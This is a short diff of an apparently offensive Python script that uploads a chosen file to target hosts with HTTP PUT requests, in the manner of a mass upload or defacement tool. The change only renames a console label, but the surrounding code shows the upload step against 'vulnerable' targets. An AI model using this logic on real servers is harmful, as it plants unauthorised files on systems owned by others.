@@ -33,7 +33,7 @@ while True:
  outname = '/'+sys.argv[2]
  print('\033[34;1m[*]\033[0m Sending Files : '+sys.argv[2])
  print('\033[34;1m[*]\033[0m Size File     : '+str(len(scheker)))
- print('\033[34;1m[*]\033[0m Target Vuln        : '+host)
+ print('\033[34;1m[*]\033[0m Scanning Target Cuks        : '+host)
  try:
     r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
  except:
